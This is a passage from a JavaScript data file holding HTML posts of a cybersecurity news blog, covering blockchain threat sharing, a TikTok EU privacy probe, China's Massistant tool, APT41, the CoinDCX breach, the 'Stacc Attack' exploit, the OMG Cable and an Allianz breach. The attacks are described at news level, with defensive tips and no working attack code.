          <li>⏳ <strong>Latency:</strong> Central authorities take too long to validate, sanitize, and share intelligence — attackers don’t wait.</li>
          <li>🔒 <strong>Trust Deficit:</strong> Many organizations fear reputational or legal consequences if they share sensitive data openly.</li>
          <li>🎯 <strong>Single Point of Failure:</strong> Centralized systems become juicy targets for attackers.</li>
          <li>🚪 <strong>Information Bottlenecks:</strong> Valuable local intelligence may never reach the broader community.</li>
          <li>🧊 <strong>Rigid Hierarchies:</strong> Centralized bodies may prioritize certain sectors or geographies over others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔗 How Blockchain Solves These Problems</h4><br>
        <p>Blockchain technology offers a secure, tamper-proof, and transparent way to share threat intelligence without needing to rely on a single authority.</p>
        <ul>
          <li>🌍 <strong>Decentralization:</strong> Every node (organization, researcher, sensor) contributes & accesses data independently.</li>
          <li>📜 <strong>Immutability:</strong> Once threat data is recorded — e.g., malicious URLs, IPs, malware hashes — it cannot be altered or deleted.</li>
          <li>🔐 <strong>Transparency with Privacy:</strong> Blockchain can allow sharing of metadata or anonymized indicators while keeping sensitive internal details hidden.</li>
          <li>⚡ <strong>Real-Time Sharing:</strong> Participants can view new indicators as soon as they’re published on the chain, enabling faster response.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📈 Real-World Success: The Cyber Shield Collective</h4><br>
        <p>In 2024, 50 global banks formed the <strong>Cyber Shield Collective</strong> — a private blockchain-based threat intelligence network. Within six months, they:</p>
        <ul>
          <li>📉 Reduced phishing attacks by 38%.</li>
          <li>🔗 Improved response times to emerging threats by 60%.</li>
          <li>📝 Created a tamper-proof audit trail for regulators and forensic teams.</li>
        </ul>
        <p>This initiative proved that decentralized sharing is not just possible — it’s powerful.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🪙 Beyond Banking: Where Else Can This Help?</h4><br>
        <ul>
          <li>🏥 <strong>Healthcare:</strong> Share indicators of ransomware or medical device vulnerabilities across hospitals.</li>
          <li>🏢 <strong>Critical Infrastructure:</strong> Energy, transportation, and water sectors can collaboratively defend against nation-state actors.</li>
          <li>🎓 <strong>Academia & Research:</strong> Universities and labs can publish findings securely while maintaining attribution.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">💡 How to Get Started</h4><br>
        <ul>
          <li>✅ Evaluate your risk appetite and compliance requirements.</li>
          <li>✅ Join or form a consortium of trusted peers.</li>
          <li>✅ Use permissioned blockchains for sensitive environments.</li>
          <li>✅ Develop APIs & automation to feed intelligence directly into your SOC (Security Operations Center).</li>
          <li>✅ Train staff to understand blockchain concepts and security controls.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">📣 Final Thoughts</h4><br>
        <p>The future of cybersecurity depends on collaboration. Blockchain gives us the tools to collaborate without fear — to share without losing privacy — and to fight back against attackers who already act collectively.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When trust is decentralized, resilience becomes inevitable.”</blockquote>
        <p>We are entering an era where no single entity can defend itself alone. Together, armed with technology and trust, we can close the gap between attacker and defender — one block at a time.</p>
      </section>

      <section style="margin-top:20px;background:#f1f1f1;padding:15px;border-radius:8px;">
        <h4 style="color:#555;">✍️ About the Authors</h4><br>
        <p><strong>Sriniketh Sudheendra</strong> is a BCA student at Christ University focusing on cybersecurity and emerging blockchain technologies.<br>
        <strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic rigor and fresh insight into blockchain’s role in cybersecurity.</p>
      </section>

    </div>
  `},{id:"tiktok-eu-privacy-investigation-2025",title:"📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers",date:"2025-07-20",author:"EthicalByte",summary:"The European Data Protection Board has launched a sweeping investigation into TikTok’s cross-border data practices. The outcome could reshape privacy enforcement and redefine global data flows.",tags:["TikTok","Data Privacy","GDPR","EU Regulations","China Data","Cybersecurity","Cross-Border"],imageKey:"tiktokEUPrivacyBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers</h3><br>
        <p style="font-style:italic;">As data becomes the new currency, Europe is asking: where does yours go?</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🇪🇺 What Happened?</h4><br>
        <p>The **European Data Protection Board (EDPB)** announced a fresh investigation into TikTok’s handling of **cross-border data transfers**, especially those going to China. TikTok, owned by China-based ByteDance, has long been under scrutiny over its privacy practices and potential risks posed to EU citizens’ data sovereignty.</p>
        <p>This move comes on the heels of rising tensions between privacy advocates and global tech firms, many of which store and process data outside the jurisdictions where it was collected.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">📜 Why This Matters</h4><br>
        <ul>
          <li>🔒 <strong>User Trust:</strong> Data privacy is not just a regulatory issue — it’s a trust issue. Users expect platforms to protect their personal information, regardless of where it’s processed.</li>
          <li>🏛️ <strong>Legal Obligations:</strong> GDPR requires clear justification and safeguards for any transfer of EU data outside the bloc.</li>
          <li>🌐 <strong>Geopolitical Tensions:</strong> The scrutiny reflects broader unease over Chinese influence in global tech and concerns of surveillance or misuse of data.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 What Could Happen?</h4><br>
        <ul>
          <li>⚖️ TikTok could face hefty fines if found non-compliant — GDPR allows penalties of up to 4% of annual global turnover.</li>
          <li>🔗 New restrictions might be imposed on how TikTok collects and processes data in Europe.</li>
          <li>🚧 A chilling effect may occur, forcing other companies to re-evaluate their cross-border data strategies.</li>
          <li>📝 Could catalyze stronger data residency laws requiring EU user data to remain within EU servers.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📜 A Pattern of Scrutiny</h4><br>
        <p>This isn’t the first time TikTok has been questioned over its data practices:</p>
        <ul>
          <li>In 2020, India banned TikTok citing privacy and national security concerns.</li>
          <li>In 2022, the US considered similar measures, prompting TikTok to set up “Project Texas” to segregate US data.</li>
          <li>Several EU countries, including Ireland and France, have already opened local probes into TikTok’s compliance with GDPR.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔎 What Should Businesses & Users Do?</h4><br>
        <p>This investigation is a clear signal to businesses and individuals alike:</p>
        <ul>
          <li>✅ Businesses should conduct **data mapping exercises** to identify where data resides and ensure GDPR‑compliant safeguards are in place.</li>
          <li>✅ Adopt **data minimization** — only collect and transfer what is absolutely necessary.</li>
          <li>✅ Users should regularly review privacy policies and limit permissions they grant to apps.</li>
          <li>✅ Governments & regulators may start pushing for **data localization** to safeguard national interests.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Looking Ahead</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a globalized internet, privacy has no borders — but regulations do.”</blockquote>
        <p>This case underscores a broader struggle: how to balance innovation and global access with the need for sovereignty, transparency, and accountability.</p>
        <p>As digital citizens, it is vital to stay informed and demand better practices from the platforms we trust with our data.</p>
      </section>

      

    </div>
  `},{id:"china-massistant-phone-surveillance-2025",title:"📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border",date:"2025-07-21",author:"EthicalByte",summary:"A shocking report reveals that Chinese border police are using a secretive tool, Massistant, to silently extract GPS, messages, and even encrypted chats from visitors’ phones — raising global privacy alarms.",tags:["China","Massistant","Privacy","Surveillance","Border Security","Cybersecurity"],imageKey:"massistantSurveillanceBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border</h3><br>
        <p style="font-style:italic;">If your phone crosses the border, so does your privacy.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>According to a recent <a href="https://thehackernews.com/2025/07/chinas-massistant-tool-secretly.html" target="_blank">investigation</a>, China’s border police have been deploying a covert tool called <strong>Massistant</strong> to extract sensitive data from travelers’ phones during inspections.</p>
        <p>This tool silently installs itself, scrapes the device for GPS history, Signal chats, text messages, contacts, and photos — and then disappears without a trace.</p>
        <p>While currently known to target Android devices, researchers fear that **iPhones could be next**.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Why It Matters</h4><br>
        <ul>
          <li>📍 <strong>Invasive Surveillance:</strong> Users are unaware their data has been harvested.</li>
          <li>🕵️ <strong>Targets Everyone:</strong> Not just suspects — ordinary travelers are exposed.</li>
          <li>🔒 <strong>Signal Compromised:</strong> Even secure messaging apps like Signal may be decrypted if local data is copied.</li>
        </ul>
        <p>Massistant shows just how far state surveillance can reach when physical access to devices is involved.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 How Does It Work?</h4><br>
        <ul>
          <li>⚡ Installs silently while the device is in border agents’ possession.</li>
          <li>📂 Crawls through files, app data, GPS logs, chat histories, and downloads copies.</li>
          <li>🧹 Wipes itself clean from the phone after completing the operation, leaving no evidence behind.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Can You Do?</h4><br>
        <ul>
          <li>✅ Travel with a clean device or “travel phone” with minimal personal data.</li>
          <li>✅ Log out and uninstall sensitive apps before entering high‑risk regions.</li>
          <li>✅ Use full‑device encryption & strong passcodes.</li>
          <li>✅ Avoid unlocking your phone if not legally required to do so.</li>
        </ul>
        <p>Awareness and preparation can significantly reduce the risks to your digital privacy.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In an age where your phone holds your life, crossing a border shouldn’t mean surrendering your privacy.”</blockquote>
        <p>Massistant serves as a wake‑up call about the fragility of privacy when physical device access is involved. It’s crucial to take proactive steps and stay vigilant in an increasingly monitored world.</p>
      </section>

    </div>
  `},{id:"apt41-africa-sharepoint-c2-july-2025",title:"🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2",date:"2025-07-22",author:"EthicalByte",summary:"APT41, a China-backed hacking group, breached African government IT networks by abusing internal SharePoint servers as command‑and‑control infrastructure, using stolen admin credentials, DLL sideloading, and fake GitHub domains.",tags:["APT41","China","Africa","SharePoint","CyberEspionage","ThreatIntel"],imageKey:"apt41AfricaSharePointBanner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2</h3><br>
        <p style="font-style:italic;">Even trusted internal servers can become a weapon in the hands of attackers.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>A new investigation has revealed that <strong>APT41</strong> — a Chinese state‑linked advanced persistent threat group — infiltrated African government networks using creative and stealthy techniques.</p>
        <p>Most notably, they abused internal <strong>Microsoft SharePoint servers</strong> as command‑and‑control (C2) nodes to control malware and exfiltrate data while blending into legitimate traffic.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🧰 Tactics & Techniques</h4><br>
        <ul>
          <li>🔑 Stolen administrator credentials for initial access.</li>
          <li>🖇️ <strong>DLL sideloading</strong> — loading malicious code via trusted apps.</li>
          <li>🌐 <strong>Fake GitHub domains</strong> — masking malicious traffic as legitimate developer activity.</li>
          <li>🗃️ Exploiting internal SharePoint servers as covert C2 infrastructure.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🌍 Why Africa?</h4><br>
        <p>This campaign highlights Africa’s growing geopolitical and economic significance. APT41 targeted sensitive policy documents, trade negotiations, and natural resource data — signaling heightened Chinese interest in the region.</p>
        <p>This is one of the few publicly reported APT41 campaigns focused on Africa, showing that no region is safe from cyber‑espionage.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Should Organizations Do?</h4><br>
        <ul>
          <li>✅ Rotate and harden admin credentials; enable MFA.</li>
          <li>✅ Monitor SharePoint servers and internal web traffic for anomalies.</li>
          <li>✅ Block or closely monitor traffic to lookalike GitHub domains.</li>
          <li>✅ Implement whitelisting and restrict DLL execution paths.</li>
          <li>✅ Conduct regular threat hunting exercises based on APT41 TTPs.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When even your internal tools are suspect, vigilance inside the perimeter becomes critical.”</blockquote>
        <p>APT41’s latest activity is a stark reminder that internal platforms like SharePoint are no longer “safe zones.” Organizations must adopt a <strong>zero‑trust mindset</strong> and proactively monitor their networks to stay ahead of sophisticated threats.</p>
      </section>

    </div>
  `},{id:"coindcx-44m-internal-breach-july-2025",title:"🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe",date:"2025-07-23",author:"EthicalByte",summary:"CoinDCX, one of India’s leading crypto exchanges, suffered a $44 million internal breach from an operational account. No customer funds were affected, thanks to their secure cold wallet setup and swift incident response.",tags:["CoinDCX","Crypto Breach","Operational Wallet","Web3 Security","India","Centralized Exchange"],imageKey:"coindcxBreachBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe</h3><br>
        <p style="font-style:italic;">Proof that even non-customer wallets need bulletproof security.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>CoinDCX confirmed a <strong>sophisticated breach</strong> involving one of its internal operational wallets — not linked to customer holdings — leading to a loss of approximately <strong>$44 million (₹368–378 crore)</strong>. This wallet was specifically used to maintain liquidity across partner exchanges.</p>
        <p>Investigators identified unauthorized transactions routed through obfuscation platforms like <strong>Tornado Cash</strong>, with assets eventually diverted to <strong>Ethereum and Solana wallets</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Discovery & Response Timeline</h4><br>
        <ul>
          <li>🕵️ Blockchain investigators <strong>Cyvers</strong> and <strong>ZachXBT</strong> flagged the anomaly through on-chain behavior monitoring.</li>
          <li>🔐 CoinDCX <strong>immediately isolated</strong> the compromised account, suspended the affected Web3 wallet functionality, and launched a full forensic audit.</li>
          <li>💰 All trading activity, customer withdrawals, and INR deposits remained fully operational during the incident.</li>
          <li>💼 The company announced that <strong>internal reserves</strong> (treasury) will be used to absorb the losses, with <strong>zero impact to users</strong>.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📢 Official Statement Highlights</h4><br>
        <p>CoinDCX reaffirmed its commitment to transparency and security, stating:</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“While this incident impacted a specific operational wallet, all customer assets were and remain completely safe in our cold storage system.”</blockquote>
        <ul>
          <li>✅ Working closely with <strong>CERT-In</strong> and global cybersecurity firms to trace and recover assets.</li>
          <li>✅ Initiated a new <strong>bug bounty program</strong> to crowdsource vulnerabilities from ethical hackers.</li>
          <li>✅ Promised regular updates as the investigation progresses.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d1ecf1;padding:15px;border-radius:8px;">
        <h4 style="color:#0c5460;">📉 Context & Industry Comparison</h4><br>
        <p>This ranks as India’s <strong>second-largest exchange breach</strong>, after the infamous <strong>$235 million WazirX hack</strong> in 2024. Though smaller, the incident raises broader concerns around how internal wallets are managed across centralized exchanges.</p>
        <p>It underscores a growing trend: <strong>customer funds might be safe, but CEX infrastructure remains vulnerable</strong> to gaps in internal privilege control, wallet isolation, and real-time monitoring.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ Key Takeaways</h4><br>
        <ul>
          <li>✅ <strong>Cold wallet separation worked</strong>: Customer assets were never exposed or compromised.</li>
          <li>⚠️ <strong>Hot & operational wallets require layered monitoring and privilege access controls.</strong></li>
          <li>💬 <strong>Communication was swift</strong>, public, and transparent — helping protect the company’s trust score.</li>
          <li>🔧 <strong>Bug bounty initiative</strong> shows CoinDCX is actively learning and adapting post-incident.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌐 Final Reflection</h4><br>
        <p>As centralized exchanges evolve, so do the attack surfaces. Even systems designed for internal liquidity carry major risks when not monitored rigorously. CoinDCX’s breach may serve as a benchmark moment for CEXs worldwide to reassess internal wallet security and develop stricter frameworks for incident detection.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In Web3, your weakest wallet is your loudest breach.”</blockquote>
      </section>

    </div>
  `},{id:"cyber-heist-stacc-attack-july-2025",title:'💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"',date:"2025-07-24",author:"EthicalByte",summary:"A Canadian hacker named “StaccOverflow” (Jarett Dunn) exploited a Solana DeFi app, live-streaming a $1.9M flash loan hack. The event triggered debates on ethics, law, and the evolution of DeFi security.",tags:["DeFi","Flash Loan","Crypto Crime","StaccOverflow","Pump Fun","Solana","Smart Contract Hack"],imageKey:"staccAttackBanner",content:`
    <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e0e0e0;font-family:sans-serif;">

      <div style="text-align:center;margin-bottom:20px;">
        <h2 style="color:#1a1a1a;">💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"</h2>
        <p style="font-style:italic;">A DeFi exploit that blurs the line between ethical hacking and criminality — and it happened in broad digital daylight.</p>
      </div>

      <section>
        <h3 style="color:#e63946;">📉 What Actually Happened?</h3>
        <p>Canadian software developer <strong>Jarett Dunn</strong>, known by the alias <strong>“StaccOverflow”</strong>, carried out a <strong>$1.9 million flash loan exploit</strong> against the Solana-based meme token platform <strong>Pump Fun</strong>. What’s extraordinary is that he <em>live-streamed</em> and <em>tweeted</em> the entire event in real time — all under the claim of “ethical hacking.”</p>
        <ul>
          <li>⚠️ Exploited a smart contract vulnerability involving flash loan logic</li>
          <li>⏱️ Executed the attack in seconds</li>
          <li>🌪️ Obfuscated fund movement via Tornado Cash</li>
          <li>🎙️ Livestreamed and tweeted every step as a “public bug bounty”</li>
          <li>🚓 Arrested within hours in British Columbia</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:16px;border-radius:8px;">
        <h3 style="color:#856404;">⚖️ Ethical Hacking... or Crime?</h3>
        <p>Stacc claimed the exploit was to prove a point — that <strong>Pump Fun</strong> was insecure. He argued it was a “white-hat action,” even referring to the funds as a <em>bounty</em> and saying he was doing the project a favor.</p>
        <p>But authorities didn’t see it that way. His lack of disclosure, immediate financial gain, and use of mixers were all flagged as criminal behavior. He was arrested without bail, pending cybercrime charges.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#2a9d8f;">🛠️ Technical Breakdown</h3>
        <p>Flash loans in DeFi allow users to borrow huge amounts of crypto instantly and repay them within the same transaction. Stacc used this mechanism to manipulate token pricing, buying undervalued tokens and reselling at inflated values — effectively draining liquidity.</p>
        <ul>
          <li>🧠 Vulnerability exploited in Pump Fun’s smart contract pricing model</li>
          <li>🔄 Flash loan loop executed on-chain within seconds</li>
          <li>🧩 Asset laundering via Tornado Cash</li>
          <li>📉 Liquidity pools depleted, price manipulation confirmed</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:16px;border-radius:8px;">
        <h3 style="color:#155724;">🔐 What This Means for DeFi</h3>
        <ul>
          <li>🚨 Flash loans remain a top attack vector for under-secured smart contracts</li>
          <li>📜 Projects must implement and enforce <strong>bug bounty programs</strong> and <strong>disclosure channels</strong></li>
          <li>👥 There’s no legal gray area when millions are stolen — intent does not excuse impact</li>
          <li>🔍 The DeFi ecosystem urgently needs better <strong>on-chain forensics</strong> and exploit alerts</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#264653;">🎙️ Darknet Diaries Feature</h3>
        <p>The entire incident has been covered in <strong>Episode 152</strong> of <a href="https://darknetdiaries.com/episode/152/" target="_blank">Darknet Diaries</a>, breaking down the event, motivations, technology, and arrest. Highly recommended for cybersecurity pros and enthusiasts alike.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:16px;border-radius:8px;">
        <h3 style="color:#1a73e8;">🧠 Final Thoughts</h3>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;margin:10px 0;">
          “In DeFi, it's not just code that gets exploited — it’s trust.”
        </blockquote>
        <p>The “Stacc Attack” is a cautionary tale. Transparency is powerful, but so is accountability. While some may applaud the guts it took to livestream a heist, the law doesn’t — and won’t — applaud intent without consent. Ethical hacking must walk a razor-thin line. Are we ready to redefine what that line even looks like in Web3?</p>
      </section>

    </div>
  `},{id:"usb-cable-hacking-mg-july-2025",title:"🎙️ The USB Cable That Could Hack You: The Story of MG",date:"2025-07-25",author:"Ethicalbyte",summary:"A deep dive into the OMG Cable, a weaponized USB device created by hacker MG, capable of injecting keystrokes, executing remote payloads, and exposing the limits of hardware trust. What looks like a normal cable could be a hacker's backdoor.",tags:["Hardware Hacking","Cybersecurity","OMG Cable","MG","DEF CON","USB Exploits"],imageKey:"usbCableHackingBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🔌 The USB Cable That Could Hack You — The Story of MG</h2>
      <p><i>Published: July 25, 2025 | Author: Cyber Talk Team</i></p>
    </div>

    <section>
      <h3>🧠 Meet MG: Hacker Turned Hardware Security Legend</h3>
      <p>MG is a name that echoes through DEF CON and Black Hat. A brilliant hardware hacker who stunned the cybersecurity world with the creation of the <strong>OMG Cable</strong> — a USB cable that looks normal but behaves like a cyber weapon.</p>
      <p>The cable can connect over Wi-Fi, impersonate a keyboard (HID), and inject commands or malware in seconds — all while remaining invisible to unsuspecting users.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚙️ What Makes the OMG Cable So Dangerous?</h3>
      <ul>
        <li>✅ <strong>Indistinguishable from standard cables</strong></li>
        <li>📶 <strong>Wi-Fi Controlled</strong> — attackers can send commands wirelessly</li>
        <li>🖥️ <strong>Keystroke Injection</strong> — launches attacks within seconds</li>
        <li>🚫 <strong>Stealth Mode</strong> — leaves virtually no trace on the system</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>📽️ Evolution Timeline of the OMG Cable</h3>
      <table style="width:100%;border:1px solid #ccc;text-align:left;border-collapse:collapse;">
        <thead>
          <tr><th style="border:1px solid #ccc;padding:8px;">Year</th><th style="border:1px solid #ccc;padding:8px;">Development</th></tr>
        </thead>
        <tbody>
          <tr><td style="border:1px solid #ccc;padding:8px;">2019</td><td style="border:1px solid #ccc;padding:8px;">First DIY prototype with Arduino internals</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2020</td><td style="border:1px solid #ccc;padding:8px;">DEF CON demo and public awareness</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2022</td><td style="border:1px solid #ccc;padding:8px;">Encrypted Wi-Fi payload support added</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2023</td><td style="border:1px solid #ccc;padding:8px;">Geo-fencing, kill-switch, delayed triggers introduced</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2025</td><td style="border:1px solid #ccc;padding:8px;">USB-C and cross-platform support released</td></tr>
        </tbody>
      </table>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>💡 Key Takeaways</h3>
      <ul>
        <li>🧠 Even a cable can become a cybersecurity risk</li>
        <li>🚷 Never trust peripherals from unknown sources</li>
        <li>🔐 Implement USB access policies on enterprise devices</li>
        <li>🧰 Red teams are using OMG Cable for realistic simulations</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎧 Want More?</h3>
      <p>MG’s story and tools are discussed in depth in <strong>Darknet Diaries Ep. 154: “The Cable”</strong>. It explores how hardware trust has become a battleground for cybersecurity experts.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🔐 Final Thoughts</h3>
      <blockquote style="border-left:4px solid #28a745;padding-left:10px;">“In cybersecurity, never assume the harmless is harmless.”</blockquote>
      <p>The OMG Cable is a wake-up call: If a USB cable can be a hacker’s gateway, what else can be? From firmware to hardware, vigilance is the new default.</p>
    </section>
  </div>
`},{id:"darknet-diaries-greg-laughing-mantis-ep160-july-2025",title:"🎧 “Greg” (aka Laughing Mantis)",date:"2025-07-27",author:"EthicalByte",summary:"From teenage hacker to InfoSec advocate, Greg Linares—once known as Laughing Mantis—shares his gripping journey through early cybercrime, arrest, and redemption in this must-hear episode of Darknet Diaries.",tags:["Darknet Diaries","Hacker Story","Youth in Cybersecurity","Ethical Hacking","Redemption"],imageKey:"laughingMantisBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🎧 “Greg” (aka Laughing Mantis)</h2><br>
      <p><i>Published: July 28, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🔍 Who is Greg Linares?</h3><br>
      <p>Known in online circles as <strong>Laughing Mantis</strong>, Greg Linares was once one of the youngest hackers arrested in Arizona. His story unfolds in <em>Darknet Diaries EP 160</em>, where he shares his raw and honest journey—from digital defiance to personal redemption.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚡ Rise, Fall, and Rise Again</h3><br>
      <ul>
        <li>🧠 <strong>Early Genius:</strong> Greg started hacking in his early teens, impressing underground forums with his network exploits and manipulation skills.</li>
        <li>🚔 <strong>Reality Check:</strong> A bold mistake led to his arrest as a teenager—forever changing his life trajectory.</li>
        <li>🔁 <strong>Reinvention:</strong> Greg now openly discusses the ethics of hacking and helps educate the next generation on responsible infosec practices.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💡 Lessons from the Life of Laughing Mantis</h3><br>
      <ul>
        <li>⚖️ Talent must be paired with <strong>ethics</strong> and responsibility.</li>
        <li>🧩 One reckless decision can ripple through a lifetime.</li>
        <li>🔄 Redemption is real—growth comes from honest reflection and change.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🛠️ Actionable Insights</h3><br>
      <ul>
        <li>✅ Support youth mentorships in cybersecurity spaces.</li>
        <li>📚 Encourage ethical coding and digital responsibility education early.</li>
        <li>🎓 Give second chances—today’s rebel could be tomorrow’s innovator.</li>
        <li>🧭 Organizations should identify and engage young cyber talent before legal issues occur.</li>
        <li>🔐 Better collaboration between legal systems and educational institutions can redirect potential into progress.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎯 Final Thoughts</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Greg’s story isn’t just about hacking—it’s about humanity, healing, and how the infosec world can be a space for growth.”</blockquote>
      <p>We all make mistakes. Some are bigger than others. But the way we respond, learn, and evolve is what defines us. Greg's journey proves that even the darkest tunnels can lead to brighter outcomes when truth, humility, and guidance are present.</p>
      <p>As the cybersecurity world continues to evolve, it needs more advocates like Greg—individuals who have walked the path, stumbled, and come back stronger. Their voices carry the weight of experience and the wisdom of hindsight.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>🎧 Listen to the Full Story</h3><br>
      <p>Catch the full episode on <strong>Darknet Diaries – Episode 160: “Greg”</strong> to hear firsthand how a teenage hacker turned his life around and now shapes the future of cybersecurity with integrity and purpose.</p>
    </section>
  </div>
`},{id:"allianz-life-insurance-breach-july-2025",title:"🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users",date:"2025-07-28",author:"EthicalByte",summary:"A social engineering attack via a third-party CRM platform compromised the data of 1.4 million Allianz Life customers. The breach illustrates growing risks tied to vendor dependencies, human factors, and evolving attack surfaces in the insurance industry.",tags:["Data Breach","Cybersecurity","Social Engineering","Third-Party Risk","Insurance Security"],imageKey:"allianzBreachBanner",content:`
  <div style="background-color:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;">
      <h2>🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users</h2><br>
      <p><i>Published: July 16, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🧩 What Happened?</h3><br>
      <p>On July 16, 2025, Allianz Life Insurance Company of North America confirmed a significant cybersecurity incident involving the compromise of a third-party CRM vendor. Threat actors used <strong>social engineering tactics</strong> to manipulate support staff, gaining unauthorized access to sensitive client records.</p>
